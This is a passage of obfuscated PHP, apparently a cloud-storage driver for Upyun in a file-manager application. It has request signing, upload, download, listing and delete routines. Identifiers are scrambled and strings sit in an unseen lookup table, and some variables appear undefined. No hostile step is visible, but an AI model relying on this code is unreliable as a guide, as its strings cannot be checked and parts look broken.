$¸È£²¡‚) { $œ›Í¶¿ƒ =& $_SERVER[ïÃ°£«Ê]; if (!$¸È£²¡‚) { return !0; } $¸È£²¡‚ = is_array($¸È£²¡‚) ? $¸È£²¡‚ : array($¸È£²¡‚); $÷üÎ„–© = array($œ›Í¶¿ƒ[188] => $´òªô ş, $œ›Í¶¿ƒ[589] => array($œ›Í¶¿ƒ[7], $¸È£²¡‚)); $ÀÖé±ò– = $this->field($œ›Í¶¿ƒ[2223])->where($÷üÎ„–©)->select(); $õÊ¶«  = array_to_keyvalue($ÀÖé±ò–, $œ›Í¶¿ƒ[12], $œ›Í¶¿ƒ[2223]); return $this->removeArray($õÊ¶« ); } public function removeArray($–ûÆÌê) { $â’§´šë =& $_SERVER[ïÃ°£«Ê]; if (!$–ûÆÌê) { return !0; } $–ûÆÌê = is_array($–ûÆÌê) ? $–ûÆÌê : array($–ûÆÌê); $ò¬æåÀ = array($â’§´šë[2223] => array($â’§´šë[7], $–ûÆÌê)); Model($â’§´šë[2226])->where($ò¬æåÀ)->delete(); Model($â’§´šë[2235])->where($ò¬æåÀ)->delete(); return $this->where($ò¬æåÀ)->delete(); } } goto Eñ±¾ –ƒ÷; CÕÖîÊÍ²²: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\72\57\57\x76\60\56\x61\x70\x69\x2e\165\160\x79\165\156\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($©Ïò¤şƒ) { parent::__construct(); $this->_init($©Ïò¤şƒ); } public function _init($¶¡‰ÍÒ—) { $˜ë¾©• =& $_SERVER[ïÃ°£«Ê]; foreach ($¶¡‰ÍÒ— as $€¹û†¶¯ => $±ªšñÚ) { if (isset($this->{$€¹û†¶¯})) { $this->{$€¹û†¶¯} = $±ªšñÚ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($˜ë¾©•[1751] . LNG($˜ë¾©•[1674])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Á³²²¶Ğ, $ö°¢±˜Ğ = "\x47\105\124") { $È öÔ¶â =& $_SERVER[ïÃ°£«Ê]; $İ¶–×°ñ = gmdate($È öÔ¶â[1703]); $Ÿâ¢¤şÕ = base64_encode(hash_hmac($È öÔ¶â[1752], "{$ö°¢±˜Ğ}\x26{$Á³²²¶Ğ}\46{$İ¶–×°ñ}", md5("{$this->userpass}"), !0)); $öá’óŞÌ = array("\x41\x75\164\150\157\162\151\172\x61\x74\151\x6f\x6e\x3a\x55\x50\x59\125\116\40{$this->username}\72{$Ÿâ¢¤şÕ}", "\104\141\164\145\72{$İ¶–×°ñ}"); return $öá’óŞÌ; } public function ussRequest($–Š®ŒÃÁ, $ïƒ¶ƒ„‘ = "\107\105\124", $’¶ó‡à = false, $á½Ÿ²¤ò = false, $±ÎÇãäÊ = false) { $ğ™€‘µ =& $_SERVER[ïÃ°£«Ê]; $–Š®ŒÃÁ = trim($–Š®ŒÃÁ, $ğ™€‘µ[8]); $±–”ñÊŞ = "\x2f{$this->bucket}\x2f" . rawurlencode($–Š®ŒÃÁ); $¹ùµæà = $this->ussHeaders($±–”ñÊŞ, $ïƒ¶ƒ„‘); if ($á½Ÿ²¤ò) { $¹ùµæà = array_merge($¹ùµæà, $á½Ÿ²¤ò); } $ıÅ„ßÁÎ = url_request($this->endpoint . $±–”ñÊŞ, $ïƒ¶ƒ„‘, $’¶ó‡à, $¹ùµæà, $±ÎÇãäÊ); if (!$ıÅ„ßÁÎ) { $÷äÇÉÇİ = LNG($ğ™€‘µ[1753]); $this->writeLog($÷äÇÉÇİ); return array($ğ™€‘µ[1404] => !1, $ğ™€‘µ[1394] => $÷äÇÉÇİ); } if (strtolower($ïƒ¶ƒ„‘) == $ğ™€‘µ[227] || in_array($ıÅ„ßÁÎ[$ğ™€‘µ[1404]], array($ğ™€‘µ[261], $ğ™€‘µ[1754]))) { $’¶ó‡à = $ıÅ„ßÁÎ[$ğ™€‘µ[1755]]; if (!$ıÅ„ßÁÎ[$ğ™€‘µ[851]]) { $’¶ó‡à = isset($’¶ó‡à[0]) ? $’¶ó‡à[0] : $ğ™€‘µ[12]; } } else { $’¶ó‡à = json_decode($ıÅ„ßÁÎ[$ğ™€‘µ[1394]], !0); if (!$’¶ó‡à) { $’¶ó‡à = $ıÅ„ßÁÎ[$ğ™€‘µ[1394]]; } else { if (!$ıÅ„ßÁÎ[$ğ™€‘µ[851]] && isset($’¶ó‡à[$ğ™€‘µ[1756]])) { $’¶ó‡à = $’¶ó‡à[$ğ™€‘µ[1756]]; } } } if (!$ıÅ„ßÁÎ[$ğ™€‘µ[851]]) { $this->writeLog($this->__errorMessage($’¶ó‡à)); } return array($ğ™€‘µ[1404] => $ıÅ„ßÁÎ[$ğ™€‘µ[851]], $ğ™€‘µ[1394] => $’¶ó‡à); } private function __errorMessage($¼æÈ¸±) { $õòÇĞà =& $_SERVER[ïÃ°£«Ê]; if (!$¼æÈ¸±) { return $õòÇĞà[12]; } static $“Óø±üë = null; if (!$“Óø±üë) { $“Óø±üë = I18n::getType(); } if ($“Óø±üë != $õòÇĞà[1711]) { return $¼æÈ¸±; } $Î‹Ï„Ã = array($õòÇĞà[1757] => $õòÇĞà[1758], $õòÇĞà[1759] => $õòÇĞà[1760], $õòÇĞà[1761] => $õòÇĞà[1760], $õòÇĞà[1762] => $õòÇĞà[1763], $õòÇĞà[1764] => $õòÇĞà[1765], $õòÇĞà[1766] => $õòÇĞà[1767], $õòÇĞà[1768] => $õòÇĞà[1769]); return isset($Î‹Ï„Ã[$¼æÈ¸±]) ? $Î‹Ï„Ã[$¼æÈ¸±] : $¼æÈ¸±; } public function mkfile($«Á‰Ïé¦, $Ú»¸ì’À = '', $Ô”è¢É“ = REPEAT_RENAME) { if ($this->setContent($«Á‰Ïé¦, $Ú»¸ì’À)) { return $this->getPathOuter($«Á‰Ïé¦); } return !1; } public function mkdir($Ò©²İÂ, $ßß£¢ËŠ = REPEAT_SKIP) { $æİé¨¯„ =& $_SERVER[ïÃ°£«Ê]; $ØäØ¦ÂÚ = trim($Ò©²İÂ, $æİé¨¯„[8]); if ($this->_isFolder($ØäØ¦ÂÚ)) { return $this->getPathOuter($ØäØ¦ÂÚ); } $È»œ…É‡ = array($æİé¨¯„[1770]); $‰µÌíüî = $this->ussRequest($ØäØ¦ÂÚ, $æİé¨¯„[288], !1, $È»œ…É‡); return $‰µÌíüî[$æİé¨¯„[1404]] ? $this->getPathOuter($ØäØ¦ÂÚ) : !1; } public function copyFile($‹ÈÆéº, $ âğ÷‚) { $Ê¹ß…¥Ï =& $_SERVER[ïÃ°£«Ê]; $Øíéµ×ƒ = array($Ê¹ß…¥Ï[1771] . "\x2f{$this->bucket}\57{$‹ÈÆéº}", $Ê¹ß…¥Ï[1772]); $úÅ™‹™ç = $this->ussRequest($ âğ÷‚, $Ê¹ß…¥Ï[253], !1, $Øíéµ×ƒ); return $úÅ™‹™ç[$Ê¹ß…¥Ï[1404]] ? !0 : $this->getPathOuter($ âğ÷‚); } public function moveFile($ş…ãÎÎ, $ôÚÙ…ëÖ) { $È£ÀîÔ =& $_SERVER[ïÃ°£«Ê]; $Àæûç± = array($È£ÀîÔ[1773] . "\57{$this->bucket}\x2f{$ş…ãÎÎ}", $È£ÀîÔ[1772]); $ş“ Õ³ñ = $this->ussRequest($ôÚÙ…ëÖ, $È£ÀîÔ[253], !1, $Àæûç±); return $ş“ Õ³ñ[$È£ÀîÔ[1404]] ? !0 : $this->getPathOuter($ôÚÙ…ëÖ); } public function delFile($²ÇÇ’îÜ) { $„ÖÍ…öä =& $_SERVER[ïÃ°£«Ê]; $Ç‹× “ = $this->ussRequest($²ÇÇ’îÜ, $„ÖÍ…öä[1774]); return $Ç‹× “[$„ÖÍ…öä[1404]] ? !0 : !1; } public function delFolder($Ë§ØÇñ) { $–‰Íüş =& $_SERVER[ïÃ°£«Ê]; if (!$this->exist($Ë§ØÇñ)) { return !0; } $this->listItemCache = !1; $ØĞ‚ûƒÀ = $äÀò¥Ô¨ = array(); $this->fileList($Ë§ØÇñ, $ØĞ‚ûƒÀ, $äÀò¥Ô¨, !0); $this->listItemCache = !0; foreach ($äÀò¥Ô¨ as $ùƒ÷…‚Ó) { $¡ÉÄÒ°Ì = $this->ussRequest($ùƒ÷…‚Ó[$–‰Íüş[32]], $–‰Íüş[1774]); if (!$¡ÉÄÒ°Ì[$–‰Íüş[1404]]) { return !1; } } usort($ØĞ‚ûƒÀ, function ($ï²—¢è¹, $…İµ°Í…) { $Ä»Ãğğœ =& $_SERVER[ïÃ°£«Ê]; return substr_count($…İµ°Í…, $Ä»Ãğğœ[8]) - substr_count($ï²—¢è¹, $Ä»Ãğğœ[8]); }); foreach ($ØĞ‚ûƒÀ as $®“ëß—¯) { $¡ÉÄÒ°Ì = $this->ussRequest($®“ëß—¯, $–‰Íüş[1774]); if (!$¡ÉÄÒ°Ì[$–‰Íüş[1404]]) { return !1; } } $¡ÉÄÒ°Ì = $this->ussRequest($Ë§ØÇñ, $–‰Íüş[1774]); return $¡ÉÄÒ°Ì[$–‰Íüş[1404]]; } public function rename($õ¥°‘‚®, $Ì“Şš· ) { if ($this->isFile($õ¥°‘‚®)) { $Ì“Şš·  = get_path_father($õ¥°‘‚®) . $Ì“Şš· ; return $this->moveFile($õ¥°‘‚®, $Ì“Şš· ); } return $this->renameObject($õ¥°‘‚®, $Ì“Şš· ); } public function fileInfo($üäÛœç´, $´Ü¸ş¿¶ = false, $²èšã¤• = array()) { $¦è¸ë»Ê =& $_SERVER[ïÃ°£«Ê]; $¯Å†Ò‡ = array($¦è¸ë»Ê[32] => $this->pathThis($üäÛœç´), $¦è¸ë»Ê[87] => $this->getPathOuter($¦è¸ë»Ê[8] . $üäÛœç´), $¦è¸ë»Ê[33] => $¦è¸ë»Ê[230], $¦è¸ë»Ê[79] => isset($²èšã¤•[$¦è¸ë»Ê[79]]) ? $²èšã¤•[$¦è¸ë»Ê[79]] : 0, $¦è¸ë»Ê[166] => $this->ext($üäÛœç´)); if ($´Ü¸ş¿¶) { return $¯Å†Ò‡; } $¯Å†Ò‡[$¦è¸ë»Ê[231]] = $¯Å†Ò‡[$¦è¸ë»Ê[88]] = 0; $¯Å†Ò‡[$¦è¸ë»Ê[232]] = $¯Å†Ò‡[$¦è¸ë»Ê[233]] = !0; if (empty($²èšã¤•)) { $²èšã¤• = $this->objectMeta($üäÛœç´); if (!$²èšã¤•) { return $¯Å†Ò‡; } } $¯Å†Ò‡[$¦è¸ë»Ê[231]] = intval($²èšã¤•[$¦è¸ë»Ê[1775]]); $¯Å†Ò‡[$¦è¸ë»Ê[88]] = intval($²èšã¤•[$¦è¸ë»Ê[1776]]); $¯Å†Ò‡[$¦è¸ë»Ê[79]] = $²èšã¤•[$¦è¸ë»Ê[79]]; return $¯Å†Ò‡; } public function folderInfo($ëÏäğÎ, $ßá…¢¾® = false) { $ô¼Èõ´  =& $_SERVER[ïÃ°£«Ê]; $Öş Àæ = array($ô¼Èõ´ [32] => $this->pathThis($ëÏäğÎ), $ô¼Èõ´ [87] => $this->getPathOuter($ô¼Èõ´ [8] . $ëÏäğÎ), $ô¼Èõ´ [33] => $ô¼Èõ´ [78]); if ($ßá…¢¾®) { return $Öş Àæ; } $Öş Àæ[$ô¼Èõ´ [231]] = $Öş Àæ[$ô¼Èõ´ [88]] = 0; $Öş Àæ[$ô¼Èõ´ [232]] = $Öş Àæ[$ô¼Èõ´ [233]] = !0; if (empty($¨ò¦½‡ı)) { $¨ò¦½‡ı = $this->objectMeta($ëÏäğÎ); if (!$¨ò¦½‡ı) { return $Öş Àæ; } } $Öş Àæ[$ô¼Èõ´ [231]] = intval($¨ò¦½‡ı[$ô¼Èõ´ [1775]]); $Öş Àæ[$ô¼Èõ´ [88]] = intval($¨ò¦½‡ı[$ô¼Èõ´ [1776]]); return $Öş Àæ; } private function listObjs($Õªü‰é, $ƒ¯¿’ = 0, $Áû±Ô¼î = 1000) { $¹äÊ­˜’ =& $_SERVER[ïÃ°£«Ê]; $É‡Å´æû = array($¹äÊ­˜’[1777], $¹äÊ­˜’[1778] . $Áû±Ô¼î); if ($ƒ¯¿’) { $É‡Å´æû[] = $¹äÊ­˜’[1779] . $ƒ¯¿’; } $½ïÄÓÇ¸ = $this->ussRequest($Õªü‰é, $¹äÊ­˜’[1607], !1, $É‡Å´æû); return !$½ïÄÓÇ¸[$¹äÊ­˜’[1404]] ? !1 : $½ïÄÓÇ¸[$¹äÊ­˜’[1394]]; } private function fileList($Ñ÷²™¹î, &$ÉÈ˜Õ†, &$Óã¾««È, $­¼ª÷î˜ = false) { $ßÄÆç“• =& $_SERVER[ïÃ°£«Ê]; $‚Û©ï×‰ = $ßÄÆç“•[12]; $¨¢ƒß™ë = 1000; $ê™€Æ˜æ = rtrim($Ñ÷²™¹î, $ßÄÆç“•[8]) . $ßÄÆç“•[8]; while (!0) { check_abort(); $üŠ›å = $this->listObjs($Ñ÷²™¹î, $‚Û©ï×‰, $¨¢ƒß™ë); if (!$üŠ›å) { return !1; } $‚Û©ï×‰ = isset($üŠ›å[$ßÄÆç“•[1780]]) ? $üŠ›å[$ßÄÆç“•[1780]] : $ßÄÆç“•[12]; $À¼™«éı = isset($üŠ›å[$ßÄÆç“•[1781]]) ? $üŠ›å[$ßÄÆç“•[1781]] : array(); foreach ($À¼™«éı as $â…æêÒ¬) { $¯ÍñÎ­¿ = $â…æêÒ¬[$ßÄÆç“•[33]] == $ßÄÆç“•[78] ? !0 : !1; $èºÅ›Òš = ltrim($ê™€Æ˜æ . $â…æêÒ¬[$ßÄÆç“•[32]], $ßÄÆç“•[8]) . ($¯ÍñÎ­¿ ? $ßÄÆç“•[8] : $ßÄÆç“•[12]); $ß–äô°´ = array($ßÄÆç“•[32] => $èºÅ›Òš, $ßÄÆç“•[33] => $¯ÍñÎ­¿ ? $ßÄÆç“•[78] : $ßÄÆç“•[230], $ßÄÆç“•[79] => $â…æêÒ¬[$ßÄÆç“•[412]], $ßÄÆç“•[1776] => $â…æêÒ¬[$ßÄÆç“•[1782]]); $this->cacheMethodInfoSet($èºÅ›Òš, $¯ÍñÎ­¿, $ß–äô°´); if ($¯ÍñÎ­¿) { $ÉÈ˜Õ†[] = $èºÅ›Òš; if ($­¼ª÷î˜) { $this->fileList($èºÅ›Òš, $ÉÈ˜Õ†, $Óã¾««È, $­¼ª÷î˜); } continue; } $Óã¾««È[] = $ß–äô°´; } if (count($À¼™«éı) < $¨¢ƒß™ë) { break; } } $this->cacheMethodInfoSet($Ñ÷²™¹î, !0); } public function listPath($âàñò, $œˆÛû¤ˆ = false) { $ËË‰ıôŠ =& $_SERVER[ïÃ°£«Ê]; $·òµ»Øé = $–ùÓ«Û = array(); $this->fileList($âàñò, $·òµ»Øé, $–ùÓ«Û); foreach ($·òµ»Øé as $îã÷ù–Å => $£„ğ•Î) { $·òµ»Øé[$îã÷ù–Å] = $this->folderInfo($£„ğ•Î, $œˆÛû¤ˆ); } foreach ($–ùÓ«Û as $îã÷ù–Å => $£„ğ•Î) { $–ùÓ«Û[$îã÷ù–Å] = $this->fileInfo($£„ğ•Î[$ËË‰ıôŠ[32]], $œˆÛû¤ˆ, $£„ğ•Î); } return array($ËË‰ıôŠ[85] => $·òµ»Øé, $ËË‰ıôŠ[86] => $–ùÓ«Û); } public function has($•ºÛ¿û“, $˜¼¿üŒ„ = false, $Ë¹¦ƒÌ– = true) { $ó”Šö¥û =& $_SERVER[ïÃ°£«Ê]; $¹üİ’„ = $ó”Šö¥û[12]; $ËŠ€À±¿ = 500; $ åíñ¢ = 0; $»õó£Œ = 0; $è¸½ëÈà = rtrim($•ºÛ¿û“, $ó”Šö¥û[8]) . $ó”Šö¥û[8]; while (!0) { check_abort(); $ÅşÇÕûê = $this->listObjs($•ºÛ¿û“, $¹üİ’„, $ËŠ€À±¿); if (!$ÅşÇÕûê) { return !1; } $¹üİ’„ = isset($ÅşÇÕûê[$ó”Šö¥û[1780]]) ? $ÅşÇÕûê[$ó”Šö¥û[1780]] : $ó”Šö¥û[12]; $ İ’â´ = isset($ÅşÇÕûê[$ó”Šö¥û[1781]]) ? $ÅşÇÕûê[$ó”Šö¥û[1781]] : array(); if (empty($ İ’â´)) { break; } $ºô´çéá = array_filter($ İ’â´, function ($Ä–†Æ¾À) { $ùÄÃ™Œ® =& $_SERVER[ïÃ°£«Ê]; return $Ä–†Æ¾À[$ùÄÃ™Œ®[33]] == $ùÄÃ™Œ®[78]; }); $ö¾’€ƒ = count($ İ’â´); $ºô´çéá = count($ºô´çéá); $¤Œ‘± = $ö¾’€ƒ - $ºô´çéá; if ($˜¼¿üŒ„) { $»õó£Œ += $ºô´çéá; $ åíñ¢ += $¤Œ‘±; if ($ö¾’€ƒ < $ËŠ€À±¿) { break; } continue; } if ($Ë¹¦ƒÌ–) { if ($¤Œ‘±) { return !0; } } else { if ($ºô´çéá) { return !0; } } if ($ö¾’€ƒ < $ËŠ€À±¿) { break; } } if ($˜¼¿üŒ„) { return array($ó”Šö¥û[239] => $ åíñ¢, $ó”Šö¥û[240] => $»õó£Œ); } return !1; } public function listAll($‰æÅ•±¢) { $ÅÏİ½¼Ü =& $_SERVER[ïÃ°£«Ê]; $é§–¼€Ü = $•İïÁàÑ = array(); $this->fileList($‰æÅ•±¢, $é§–¼€Ü, $•İïÁàÑ, !0); $Ş££¶£ = array_to_keyvalue($•İïÁàÑ, $ÅÏİ½¼Ü[32]); foreach ($é§–¼€Ü as $¬öî“â) { if (is_string($¬öî“â)) { $Ş££¶£[$¬öî“â] = array($ÅÏİ½¼Ü[79] => 0); } } return $this->listAllFiles($‰æÅ•±¢, $Ş££¶£); } public function canRead($•ÓĞğ—¢) { return $this->exist($•ÓĞğ—¢) ? !0 : !1; } public function canWrite($’ˆëŒè) { return $this->exist($’ˆëŒè) ? !0 : !1; } public function getContent($öÅŸ¢“Ä) { return $this->fileSubstr($öÅŸ¢“Ä, 0, -1); } public function setContent($ãı Ú¤, $”ÆÕÁïË = '') { $ıöâäó =& $_SERVER[ïÃ°£«Ê]; if (!$”ÆÕÁïË) { $°»äæßƒ = $this->ussRequest($ãı Ú¤, $ıöâäó[288]); return $°»äæßƒ[$ıöâäó[1404]]; } $˜ˆŞ”§ = $this->tempFile($this->pathThis($ãı Ú¤)); file_put_contents($˜ˆŞ”§, $”ÆÕÁïË); if ($this->upload($ãı Ú¤, $˜ˆŞ”§)) { $this->tempFileRemve($˜ˆŞ”§); return !0; } return !1; } public function fileSubstr($öœæäœó, $º©ÛÔ€¼, $Ë‹­úõà) { $ó–ƒ¿±ä =& $_SERVER[ïÃ°£«Ê]; if (!($ˆ“Ø…‡³ = $this->link($öœæäœó))) { return !1; } $‘ÅğÁ“Ü = !1; if ($Ë‹­úõà > 0) { $¶ä²©äÁ = $º©ÛÔ€¼ + $Ë‹­úõà - 1; $‘ÅğÁ“Ü = array($ó–ƒ¿±ä[1606] . $º©ÛÔ€¼ . $ó–ƒ¿±ä[476] . $¶ä²©äÁ); } $Èñïœèˆ = url_request($ˆ“Ø…‡³, $ó–ƒ¿±ä[1607], !1, $‘ÅğÁ“Ü); return $Èñïœèˆ[$ó–ƒ¿±ä[851]] ? $Èñïœèˆ[$ó–ƒ¿±ä[1394]] : !1; } public function upload($¨åèÍ‘Ò, $Š£Š¬ˆş, $øôá—¥‰ = false, $©×’Ñûâ = REPEAT_REPLACE) { $¤¦şªõÄ =& $_SERVER[ïÃ°£«Ê]; if (!$Š£Š¬ˆş || !@file_exists($Š£Š¬ˆş)) { return !1; } $º‹ªŠø = IO::size($Š£Š¬ˆş); if ($º‹ªŠø <= 1024 * 1024 * 200) { $««…§âØ = array($¤¦şªõÄ[1783] . $Š£Š¬ˆş); $Å‡ûñ”ş = $this->ussRequest($¨åèÍ‘Ò, $¤¦şªõÄ[253], $««…§âØ); return $Å‡ûñ”ş[$¤¦şªõÄ[1404]] ? $this->getPathOuter($¨åèÍ‘Ò) : !1; } $ÅşæåÛö = 1024 * 1024 * 10; $ˆ‹¶¸· = array($¤¦şªõÄ[1784], $¤¦şªõÄ[1785] . $º‹ªŠø, $¤¦şªõÄ[1786], $¤¦şªõÄ[1787] . $ÅşæåÛö); $Å‡ûñ”ş = $this->ussRequest($¨åèÍ‘Ò, $¤¦şªõÄ[253], !1, $ˆ‹¶¸·); if (!$Å‡ûñ”ş[$¤¦şªõÄ[1404]]) { return !1; } $­¯ìÚÔ = $Å‡ûñ”ş[$¤¦şªõÄ[1394]]; $—ìòñ = 0; $›äŠ·Æ = $­¯ìÚÔ[$¤¦şªõÄ[1788]]; $ŞßìË… = fopen($Š£Š¬ˆş, $¤¦şªõÄ[1668]); if (!$ŞßìË…) { return !1; } do { $àõİ€”Õ = $­¯ìÚÔ[$¤¦şªõÄ[1789]]; fseek_64($ŞßìË…, $—ìòñ); $Ñ¨ãá¢¶ = fread($ŞßìË…, $àõİ€”Õ); $æáÕÄÁÒ = 0; do { $æáÕÄÁÒ++; $­¯ìÚÔ = $this->uploadPart($¨åèÍ‘Ò, $­¯ìÚÔ, $Ñ¨ãá¢¶); } while (!$­¯ìÚÔ && $æáÕÄÁÒ < 3); if (!$­¯ìÚÔ) { return !1; } $›äŠ·Æ = $­¯ìÚÔ[$¤¦şªõÄ[1788]]; $—ìòñ += $àõİ€”Õ; } while ($›äŠ·Æ != -1); fclose($ŞßìË…); $ˆ‹¶¸· = array($¤¦şªõÄ[1790], $¤¦şªõÄ[1791] . $­¯ìÚÔ[$¤¦şªõÄ[1792]], $¤¦şªõÄ[1786]); $Å‡ûñ”ş = $this->ussRequest($¨åèÍ‘Ò, $¤¦şªõÄ[253], !1, $ˆ‹¶¸·); return $Å‡ûñ”ş[$¤¦şªõÄ[1404]] ? $this->getPathOuter($¦è¼”«š) : !1; } private function uploadPart($üôûÍğõ, $˜ÀÔ, &$í®Ÿâıå) { $…½«İîé =& $_SERVER[ïÃ°£«Ê]; $ÇÆ¶¢Õ = array($…½«İîé[1793], $…½«İîé[1791] . $˜ÀÔ[$…½«İîé[1792]], $…½«İîé[1794] . $˜ÀÔ[$…½«İîé[1788]], $…½«İîé[143] . $˜ÀÔ[$…½«İîé[1789]]); $ğ…è² = $this->ussRequest($üôûÍğõ, $…½«İîé[253], $í®Ÿâıå, $ÇÆ¶¢Õ); return !$ğ…è²[$…½«İîé[1404]] ? $ğ…è²[$…½«İîé[1404]] : $ğ…è²[$…½«İîé[1394]]; } public function uploadFormData($ÜŸ—¡ê”, $æ—¸“«‘ = 3600) { return $this->uploadPolicy($ÜŸ—¡ê”, $æ—¸“«‘); } public function uploadMultiData($Ë Ù“§, $æÀÌÇì = 3600) { $£öÛ ù =& $_SERVER[ïÃ°£«Ê]; $‚Ä¦¤ = (int) $GLOBALS[$£öÛ ù[7]][$£öÛ ù[79]]; return $this->uploadPolicy($Ë Ù“§, $æÀÌÇì, $‚Ä¦¤); } private function uploadPolicy($Á§²±Û÷, $‡ÂĞ¬Ãç = 3600, $‘ èı× = 0) { $—èÀõ»ğ =& $_SERVER[ïÃ°£«Ê]; $á¡ÏÆó÷ = $—èÀõ»ğ[8] . $this->bucket; $ ¯¥Í—˜ = gmdate($—èÀõ»ğ[1703]); $ÄÛ¨¡ï° = array($—èÀõ»ğ[1795] => $this->bucket, $—èÀõ»ğ[1796] => $Á§²±Û÷, $—èÀõ»ğ[1797] => time() + $‡ÂĞ¬Ãç, $—èÀõ»ğ[1798] => $ ¯¥Í—˜); if ($‘ èı×) { $ÄÛ¨¡ï°[$—èÀõ»ğ[1688]] = $‘ èı×; } $†­›×ş = base64_encode(json_encode($ÄÛ¨¡ï°)); $ô£Îá§ô = base64_encode(hash_hmac($—èÀõ»ğ[1752], "\120\x4f\123\124\46{$á¡ÏÆó÷}\46{$ ¯¥Í—˜}\x26{$†­›×ş}", md5("{$this->userpass}"), !0)); $™Ö‚¿¡¾ = array($—èÀõ»ğ[277] => $†­›×ş, $—èÀõ»ğ[1799] => "\125\x50\131\x55\116\40{$this->username}\x3a{$ô£Îá§ô}", $—èÀõ»ğ[206] => $this->endpoint . $á¡ÏÆó÷); return $™Ö‚¿¡¾; } public function download($Æ˜ß›, $õï‰°ˆË) { $àóìË¶š = IO::getPathInner(IO::mkfile($õï‰°ˆË)); if (!($»Ä‘¼ ¸ = $this->link($Æ˜ß›))) { return !1; } $×ìªÉ¹ = 0; $ü®³¤ÚÛ = 1024 * 200; $´üØ½½À = fopen($àóìË¶š, $_SERVER[ïÃ°£«Ê][1747]); while (!0) { $ò‹Îëì® = $this->fileSubstr($Æ˜ß›, $×ìªÉ¹, $ü®³¤ÚÛ); if ($ò‹Îëì® === !1) { return !1; } fwrite($´üØ½½À, $ò‹Îëì®); $×ìªÉ¹ += $ü®³¤ÚÛ; if (strlen($ò‹Îëì®) < $ü®³¤ÚÛ) { break; } } fclose($´üØ½½À); return $õï‰°ˆË; } public function link($¶Â²‡ç£, $™ï‡˜èÑ = array()) { $ôßÀú§Ó =& $_SERVER[ïÃ°£«Ê]; $¶Â²‡ç£ = trim($¶Â²‡ç£, $ôßÀú§Ó[8]); if (!empty($this->token)) { $•—ı¬õ = strtotime(date($ôßÀú§Ó[1800])); $ˆäÁù×ì = substr(md5($this->token . $ôßÀú§Ó[284] . $•—ı¬õ . $ôßÀú§Ó[1801] . $¶Â²‡ç£), 12, 8) . $•—ı¬õ; $™ï‡˜èÑ[] = $ôßÀú§Ó[1802] . $ˆäÁù×ì; } $î§¸ÌûÕ = !empty($™ï‡˜èÑ) ? $ôßÀú§Ó[76] . implode($ôßÀú§Ó[284], $™ï‡˜èÑ) : $ôßÀú§Ó[12]; return $this->getHost() . $ôßÀú§Ó[8] . $this->pathEncode($¶Â²‡ç£) . $î§¸ÌûÕ; } public function fileOut($Ñ§îÍĞ, $…¿…«İ‘ = false, $»—µå« = false, $‰á·êæ‚ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Ñ§îÍĞ, $…¿…«İ‘, $»—µå«, $‰á·êæ‚); } if (!$»—µå«) { $»—µå« = $this->pathThis($Ñ§îÍĞ); } $×áâ•ï = $…¿…«İ‘ ? array($_SERVER[ïÃ°£«Ê][1803] . rawurlencode($»—µå«)) : array(); $³ãÕó§Ç = $this->link($Ñ§îÍĞ, $×áâ•ï); $this->fileOutLink($³ãÕó§Ç); } public function fileOutServer($¡ÛÓê, $íøğæ”É = false, $í€¤å¡§ = false, $Êá¼¬ŞÕ = '') { parent::fileOut($¡ÛÓê, $íøğæ”É, $í€¤å¡§, $Êá¼¬ŞÕ); } public function fileOutImage($ÒÂÌ¸›é, $—ÁµÙ¯ = 250) { $Ò¹Á¥à = $this->link($ÒÂÌ¸›é . $_SERVER[ïÃ°£«Ê][1804] . $—ÁµÙ¯); $this->fileOutLink($Ò¹Á¥à); } public function fileOutImageServer($ü¤½Á©‚, $ÕıÒöÇ· = 250) { parent::fileOutImage($ü¤½Á©‚, $ÕıÒöÇ·); } public function hashMd5($„‘àÍÛ§) { $—ıáıä =& $_SERVER[ïÃ°£«Ê]; $ÛµÄ“äî = $this->_objectMeta($„‘àÍÛ§); return isset($ÛµÄ“äî[$—ıáıä[245]]) ? $ÛµÄ“äî[$—ıáıä[245]] : !1; } public function size($øÍù„Ì) { $Ôº´‚‚õ = $this->objectMeta($øÍù„Ì); return $Ôº´‚‚õ ? $Ôº´‚‚õ[$_SERVER[ïÃ°£«Ê][79]] : 0; } public function info($³ÉƒĞ® ) { if ($this->isFolder($³ÉƒĞ® )) { return $this->folderInfo($³ÉƒĞ® ); } else { if ($this->isFile($³ÉƒĞ® )) { return $this->fileInfo($³ÉƒĞ® ); } } return !1; } public function exist($µ‡µÃ) { return $this->isFile($µ‡µÃ) || $this->isFolder($µ‡µÃ); } public function isFile($¶ªˆşçØ) { return !$this->isFolder($¶ªˆşçØ) && $this->objectMeta($¶ªˆşçØ); } public function isFolder($™ê°‰ùÓ) { return $this->cacheMethod($_SERVER[ïÃ°£«Ê][177], $™ê°‰ùÓ); } protected function objectMeta($Öã¸œºÕ) { return $this->cacheMethod($_SERVER[ïÃ°£«Ê][179], $Öã¸œºÕ); } protected function _objectMeta($ı¸©ÓÒ) { $í×û ³è =& $_SERVER[ïÃ°£«Ê]; if ($ı¸©ÓÒ == $í×û ³è[12] || $ı¸©ÓÒ == $í×û ³è[8]) { return array(); } $º‘‹İØ = $this->ussRequest($ı¸©ÓÒ, $í×û ³è[1805]); if (!$º‘‹İØ[$í×û ³è[1404]]) { return null; } $Ğòß¯ªâ = isset($º‘‹İØ[$í×û ³è[1394]]) ? $º‘‹İØ[$í×û ³è[1394]] : array(); if (!isset($Ğòß¯ªâ[$í×û ³è[1806]])) { return null; } $Û²¬Îëš = array($í×û ³è[33] => isset($Ğòß¯ªâ[$í×û ³è[1806]]) ? $Ğòß¯ªâ[$í×û ³è[1806]] : null, $í×û ³è[79] => isset($Ğòß¯ªâ[$í×û ³è[1807]]) ? $Ğòß¯ªâ[$í×û ³è[1807]] : null, $í×û ³è[245] => isset($Ğòß¯ªâ[$í×û ³è[1808]]) ? $Ğòß¯ªâ[$í×û ³è[1808]] : null, $í×û ³è[1775] => isset($Ğòß¯ªâ[$í×û ³è[1809]]) ? $Ğòß¯ªâ[$í×û ³è[1809]] : null); $Û²¬Îëš[$í×û ³è[1776]] = isset($Ğòß¯ªâ[$í×û ³è[1810]]) ? strtotime($Ğòß¯ªâ[$í×û ³è[1810]]) : $Û²¬Îëš[$í×û ³è[1775]]; return $Û²¬Îëš; } protected function 